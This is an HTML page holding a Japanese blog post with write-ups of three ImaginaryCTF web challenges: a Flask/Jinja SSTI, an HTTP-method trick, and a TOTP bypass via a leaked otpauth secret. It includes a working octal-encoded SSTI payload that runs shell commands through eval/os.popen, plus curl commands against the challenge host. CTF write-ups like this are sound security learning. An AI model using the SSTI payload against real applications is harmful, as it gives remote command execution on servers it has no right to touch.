@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        ImaginaryCTF-Web-Writeups ::
+        er072391 Blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="ImaginaryCTF Web[Wisdom] # ImaginaryCTFのWeb問のWriteupを書きます。
+ソースコードはこちら
+1	#!/usr/bin/env python3 2	from flask import Flask, render_template_string, request, Response 3	app = Flask(__name__) 4	init_config = {key:app.config[key] for key in app.config} 5	@app.route(&amp;#39;/&amp;#39;) 6	def index(): 7	return Response(open(__file__).read(), mimetype=&amp;#39;text/plain&amp;#39;) 8	@app.route(&amp;#39;/docker&amp;#39;) 9	def docker(): 10	return Response(open(&amp;#34;Dockerfile&amp;#34;).read(), mimetype=&amp;#39;text/plain&amp;#39;) 11	@app.route(&amp;#39;/ssti&amp;#39;) 12	def ssti(): 13	query = request.args[&amp;#39;query&amp;#39;] if &amp;#39;query&amp;#39; in request.args else &amp;#39;...&amp;#39; 14	# no persistence! 15	to_del = [] 16	for key in app."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://er072391.github.io/posts/imaginaryctf-web-writeups/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://er072391.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://er072391.github.io/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="https://er072391.github.io/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="https://er072391.github.io/img/favicon.png" />
+
+
+<link href="https://er072391.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://er072391.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://er072391.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://er072391.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://er072391.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://er072391.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ImaginaryCTF-Web-Writeups"/>
+<meta name="twitter:description" content="ImaginaryCTF Web[Wisdom] # ImaginaryCTFのWeb問のWriteupを書きます。
+ソースコードはこちら
+1	#!/usr/bin/env python3 2	from flask import Flask, render_template_string, request, Response 3	app = Flask(__name__) 4	init_config = {key:app.config[key] for key in app.config} 5	@app.route(&#39;/&#39;) 6	def index(): 7	return Response(open(__file__).read(), mimetype=&#39;text/plain&#39;) 8	@app.route(&#39;/docker&#39;) 9	def docker(): 10	return Response(open(&#34;Dockerfile&#34;).read(), mimetype=&#39;text/plain&#39;) 11	@app.route(&#39;/ssti&#39;) 12	def ssti(): 13	query = request.args[&#39;query&#39;] if &#39;query&#39; in request.args else &#39;...&#39; 14	# no persistence! 15	to_del = [] 16	for key in app."/>
+
+
+
+<meta property="og:title" content="ImaginaryCTF-Web-Writeups" />
+<meta property="og:description" content="ImaginaryCTF Web[Wisdom] # ImaginaryCTFのWeb問のWriteupを書きます。
+ソースコードはこちら
+1	#!/usr/bin/env python3 2	from flask import Flask, render_template_string, request, Response 3	app = Flask(__name__) 4	init_config = {key:app.config[key] for key in app.config} 5	@app.route(&#39;/&#39;) 6	def index(): 7	return Response(open(__file__).read(), mimetype=&#39;text/plain&#39;) 8	@app.route(&#39;/docker&#39;) 9	def docker(): 10	return Response(open(&#34;Dockerfile&#34;).read(), mimetype=&#39;text/plain&#39;) 11	@app.route(&#39;/ssti&#39;) 12	def ssti(): 13	query = request.args[&#39;query&#39;] if &#39;query&#39; in request.args else &#39;...&#39; 14	# no persistence! 15	to_del = [] 16	for key in app." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://er072391.github.io/posts/imaginaryctf-web-writeups/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-10T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-10T00:00:00+00:00" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >er072391 Blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">ImaginaryCTF-Web-Writeups</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-10-10
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="imaginaryctf-webwisdom">
+  ImaginaryCTF Web[Wisdom]
+  <a href="#imaginaryctf-webwisdom" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>ImaginaryCTFのWeb問のWriteupを書きます。</p>
+<p>ソースコードはこちら</p>
+<pre tabindex="0"><code>     1	#!/usr/bin/env python3
+       
+     2	from flask import Flask, render_template_string, request, Response
+       
+     3	app = Flask(__name__)
+       
+     4	init_config = {key:app.config[key] for key in app.config}
+       
+     5	@app.route(&#39;/&#39;)
+     6	def index():
+     7	    return Response(open(__file__).read(), mimetype=&#39;text/plain&#39;)
+       
+     8	@app.route(&#39;/docker&#39;)
+     9	def docker():
+    10	    return Response(open(&#34;Dockerfile&#34;).read(), mimetype=&#39;text/plain&#39;)
+       
+    11	@app.route(&#39;/ssti&#39;)
+    12	def ssti():
+    13	    query = request.args[&#39;query&#39;] if &#39;query&#39; in request.args else &#39;...&#39;
+       
+    14	    # no persistence!
+    15	    to_del = []
+    16	    for key in app.config:
+    17	        if key not in init_config:
+    18	            to_del.append(key)
+    19	        else:
+    20	            app.config[key] = init_config[key]
+    21	    for key in to_del:
+    22	        del app.config[key]
+       
+    23	    for attr in dir(request):
+    24	        if any(attr.startswith(i) for i in [&#34;__&#34;]):
+    25	            continue
+    26	        try:
+    27	            setattr(request, attr, None)
+    28	        except Exception as e:
+    29	            pass
+    30	            # print(&#34;Failed to set attr&#34;, attr)
+       
+    31	    # turns out flask doesn&#39;t like it when you nuke their data
+    32	    request.environ = {&#34;flask._preserve_context&#34;: False}
+       
+    33	    if len(set(query)) &gt; 16:
+    34	        return f&#34;&lt;div&gt;Too many ({len(set(query))}) unique characters!&lt;/div&gt;&#34; + \
+    35	               f&#34;&lt;div&gt;Unique characters used: {&#39;&#39;.join(set(query))}&lt;/div&gt;&#34;
+       
+    36	    return f&#34;&lt;div&gt;Number of unique characters: {len(set(query))}&lt;/div&gt;&#34; + \
+    37	           f&#34;&lt;div&gt;Unique characters used: {&#39;&#39;.join(set(query))}&lt;/div&gt;&#34; + \
+    38	           render_template_string(query)
+       
+    39	app.run(&#39;0.0.0.0&#39;, 5004)
+</code></pre><p>13行目で<code>query</code>パラメータの値を<code>query</code>変数に格納し、<br>
+33行目で<code>query</code>をset型(集合型)に変換、文字数が1７文字以上で<code>Too many...</code>と表示され、16文字以下だとFlaskの<code>render_template_string(query)</code>が実行されます。<br>
+送られる文字列のサニタイジング処理を行っていないため、<code>SSTI</code>の脆弱性が存在します。<br>
+<!-- raw HTML omitted --></p>
+<h1 id="payloadの作成">
+  Payloadの作成
+  <a href="#payload%e3%81%ae%e4%bd%9c%e6%88%90" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>set型(集合型)、つまり同じ文字は１つにまとめられます。通常のSSTIのPayloadは、<br>
+<code>{{''.__class__.__bases__[0].__subclasses__()[75]}}</code>このようにしますが、<br>
+これだと16文字を超えてしまします。Jinjaのパーサー(構文解析)は、１６進数、８進数、２進数の整数リテラルを解釈できます。Payloadを８進数にencodeし、文字数を抑えることができます。<br>
+<!-- raw HTML omitted --></p>
+<p>encode前<br>
+<code>{{''.__class__.__mro__[1].__subclasses__()[220]__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('dir').read()&quot;)}} </code><br>
+encode後<br>
+<code>{{''[%27\137\137\143\154\141\163\163\137\137%27][%27\137\137\155\162\157\137\137%27][1][%27\137\137\163\165\142\143\154\141\163\163\145\163\137\137%27]()[220]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\144\151\162\47\51\56\162\145\141\144\50\51')}}</code>
+<!-- raw HTML omitted --></p>
+<p>8進数にencodeしたことにより、<code>\1520['43)7(6}]{</code>の16種類の文字を使います。<br>
+<code>query</code>パラメータに入力し、送信することによって<code>dir</code>コマンドの実行結果を得られます。<br>
+FLAGのファイル名を知ることができるので<code>cat flagname.txt</code>でFLAGをゲットすることができます。</p>
+<!-- raw HTML omitted -->
+<h1 id="imaginaryctf-webmethodical">
+  ImaginaryCTF Web[Methodical]
+  <a href="#imaginaryctf-webmethodical" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>ソースコードはこちら</p>
+<pre tabindex="0"><code>     1	#!/usr/bin/env python3
+       
+     2	from flask import Flask, request, Response, redirect, GET
+     3	from flask_limiter import Limiter
+     4	from flask_limiter.util import get_remote_address
+       
+     5	app = Flask(__name__)
+     6	limiter = Limiter(
+     7	    app,
+     8	    key_func=get_remote_address,
+     9	    default_limits=[&#34;50000 per hour&#34;],
+    10	    storage_uri=&#34;memory://&#34;,
+    11	)
+       
+    12	@app.route(&#39;/&#39;)
+    13	@limiter.limit(&#34;5/second&#34;)
+    14	def index():
+    15	    return Response(open(__file__).read(), mimetype=&#39;text/plain&#39;)
+       
+    16	@app.route(&#39;/docker&#39;)
+    17	@limiter.limit(&#34;5/second&#34;)
+    18	def docker():
+    19	    return Response(open(&#34;Dockerfile&#34;).read(), mimetype=&#39;text/plain&#39;)
+       
+    20	@app.route(&#39;/flag&#39;, methods=GET)
+    21	@limiter.limit(&#34;5/second&#34;)
+    22	def flag():
+    23	    return open(&#39;flag.txt&#39;).read()
+       
+    24	@app.after_request
+    25	def hide_allowed(response):
+    26	    response.headers[&#34;Allow&#34;] = &#34;&#34;
+    27	    return response
+       
+    28	app.run(&#39;0.0.0.0&#39;, 6006)
+</code></pre><p>20行目〜２３行目に</p>
+<pre tabindex="0"><code>    20	@app.route(&#39;/flag&#39;, methods=GET)
+    21	@limiter.limit(&#34;5/second&#34;)
+    22	def flag():
+    23	    return open(&#39;flag.txt&#39;).read()
+</code></pre><p><code>/flag</code>にアクセスしたらFLAGを取得できそうだと思う。
+アクセスすると、</p>
+<pre tabindex="0"><code>Method Not Allowed
+The method is not allowed for the requested URL.
+</code></pre><p>405エラーが返され、受け入れられないHTTPメソッドが使用されたと言われる。<br>
+ソースコードをよく見てみると、<code>methods=GET</code>とmethodsに変数を指定している、<br>
+GET変数に何が格納されているのか、探してみる。</p>
+<!-- raw HTML omitted -->
+<p>Dockerfileを見てみる。</p>
+<pre tabindex="0"><code>     1	FROM ubuntu:20.04
+       
+     2	RUN apt-get update -y &amp;&amp; \
+     3	    apt-get install -y python3-pip python3-dev
+       
+     4	WORKDIR /app
+       
+     5	RUN pip3 install flask Flask-Limiter
+       
+     6	RUN echo aW1wb3J0IG9zCkdFVD0obGFtYmRhOlsqc3RyKG9zLnVyYW5kb20oMzIpKV0pKCAp\
+     7	|base64 -d &gt;&gt; `python3 -c &#39;print(__import__(&#34;flask&#34;).__file__)&#39;`
+       
+     8	COPY . /app
+       
+     9	RUN chmod -R 555 /app
+       
+    10	USER 1000:1000
+       
+    11	ENTRYPOINT [ &#34;python3&#34; ]
+       
+    12	CMD [ &#34;server.py&#34; ]
+</code></pre><p>6、７行目でbase64の文字列をデコードしてプログラムに渡している。
+base64の文字列をデコードしてみると、</p>
+<pre tabindex="0"><code>import os
+GET=(lambda:[*str(os.urandom(32))])( )
+</code></pre><p>32文字のランダムな文字をリストとしてGET変数に格納している。
+手元で真似してGET変数を表示してみる。</p>
+<pre tabindex="0"><code>[&#39;b&#39;, &#34;&#39;&#34;, &#39;W&#39;, &#39;1&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;f&#39;, &#39;6&#39;, &#39;&amp;&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;a&#39;, &#39;5&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;c&#39;, &#39;f&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;9&#39;, &#39;e&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;d&#39;, &#39;9&#39;, &#39;&amp;&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;b&#39;, &#39;f&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;9&#39;, &#39;8&#39;, &#39;Y&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;0&#39;, &#39;2&#39;, &#39;1&#39;, &#39;m&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;e&#39;, &#39;d&#39;, &#39;B&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;d&#39;, &#39;9&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;8&#39;, &#39;5&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;f&#39;, &#39;2&#39;, &#39;A&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;f&#39;, &#39;4&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;d&#39;, &#39;9&#39;, &#39;Q&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;b&#39;, &#39;e&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;c&#39;, &#39;9&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;1&#39;, &#39;3&#39;, &#39;w&#39;, &#39;k&#39;, &#39;y&#39;, &#39;F&#39;, &#39;\\&#39;, &#39;x&#39;, &#39;c&#39;, &#39;8&#39;, &#34;&#39;&#34;]
+</code></pre><p>このリストの中でマッチした文字や記号があれば有効なメソッドだと判断され、FLGAが表示されそうです。<br>
+何度実行しても存在するバックスラッシュをメソッドにセットし送信してみます。</p>
+<pre tabindex="0"><code>$ curl -X \\ http://puzzler7.imaginaryctf.org:6006/flag
+ictf{uppercase_HTTP_method_names_are_so_2021}
+</code></pre><!-- raw HTML omitted -->
+<h1 id="imaginaryctf-webonce-upon-a-time">
+  ImaginaryCTF Web[Once Upon A Time]
+  <a href="#imaginaryctf-webonce-upon-a-time" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>ソースコードはこちら</p>
+<pre tabindex="0"><code>     1	#!/usr/bin/env python
+       
+     2	from os import getenv, urandom
+       
+     3	from flask import (
+     4	    Flask,
+     5	    request,
+     6	    Response,
+     7	    render_template,
+     8	    flash,
+     9	    redirect,
+    10	    url_for,
+    11	    session,
+    12	)
+    13	from wtforms import StringField, PasswordField, SubmitField, IntegerField, Form
+    14	from wtforms.validators import DataRequired, Length
+       
+    15	import pyotp
+       
+    16	app = Flask(__name__)
+    17	app.secret_key = urandom(32)
+       
+       
+    18	class LoginForm(Form):
+    19	    username = StringField(&#34;Username&#34;, validators=[DataRequired(), Length(1, 20)])
+    20	    password = PasswordField(&#34;Password&#34;, validators=[DataRequired(), Length(1, 160)])
+    21	    submit = SubmitField()
+       
+       
+    22	class MFAForm(Form):
+    23	    token = IntegerField(&#34;Token&#34;, validators=[DataRequired()])
+    24	    submit = SubmitField()
+       
+       
+    25	@app.route(&#34;/login&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
+    26	def login():
+    27	    form = LoginForm(request.form)
+    28	    if request.method == &#34;POST&#34;:
+    29	        username = request.form.get(&#34;username&#34;, &#34;&#34;, type=str)
+    30	        password = request.form.get(&#34;password&#34;, &#34;&#34;, type=str)
+       
+    31	    if form.validate():
+    32	        if username == &#34;admin&#34; and password == &#34;admin&#34;:
+    33	            session[&#34;user&#34;] = &#34;admin&#34;
+    34	            return redirect(url_for(&#34;mfa&#34;))
+    35	        else:
+    36	            flash(&#34;Incorrect username or password. Please try again.&#34;)
+       
+    37	    return render_template(&#34;login.html&#34;, form=form)
+       
+       
+    38	@app.route(&#34;/loginmfa&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
+    39	def mfa():
+    40	    form = MFAForm(request.form)
+    41	    if request.method == &#34;POST&#34;:
+    42	        token = request.form.get(&#34;token&#34;, &#34;&#34;, type=int)
+       
+    43	    if form.validate() and session.get(&#34;user&#34;, &#34;&#34;) == &#34;admin&#34;:
+    44	        # generate secret from otpauth-migration://offline?data=CisKFE4wVFRIM0ZMNEdCVVRVUkNMMFNFEg1vbmNldXBvbmF0aW1lIAEoATACEAEYASAA
+    45	        secret = getenv(&#34;OTPSECRET&#34;)
+    46	        if pyotp.TOTP(secret).verify(token):
+    47	            return Response(getenv(&#34;FLAG&#34;), mimetype=&#34;text/plain&#34;)
+    48	    else:
+    49	        flash(&#34;Incorrect TOTP. Please try again.&#34;)
+    50	    return render_template(&#34;loginmfa.html&#34;, form=form)
+       
+       
+    51	@app.route(&#34;/&#34;)
+    52	def source():
+    53	    return Response(open(__file__).read(), mimetype=&#34;text/plain&#34;)
+       
+       
+    54	if __name__ == &#34;__main__&#34;:
+    55	    app.run(&#34;0.0.0.0&#34;, 5000)
+</code></pre><p><code>username=admin&amp;password=admin</code>にしたら<code>/loginmfa</code>に飛ばされ、<br>
+OTP認証を突破しなければいけない。<br>
+ソースコードの44行目のコメントに<code># generate secret from otpauth-migration://offline?data=CisKFE4wVFRIM0ZMNEdCVVRVUkNMMFNFEg1vbmNldXBvbmF0aW1lIAEoATACEAEYASAA</code>とあり、<code>otpauth-migration</code>を調べたらGoogle認証システムだというのがわかった。<br>
+<a href="https://github.com/dim13/otpauth">https://github.com/dim13/otpauth</a> で、デコードすると秘密鍵を入手でき、keepassxcで認証コードをゲットし、OTP認証を突破できる。</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://er072391.github.io/posts/elf%E3%81%AE%E4%BF%9D%E8%AD%B7%E6%A9%9F%E8%83%BD%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">ELFの保護機能について</span>
+                </a>
+              </span>
+            
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >er072391 Blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span
+          >© 2022 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
+        >
+        <span
+          >Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
+        >
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://er072391.github.io/assets/main.js"></script>
+<script src="https://er072391.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
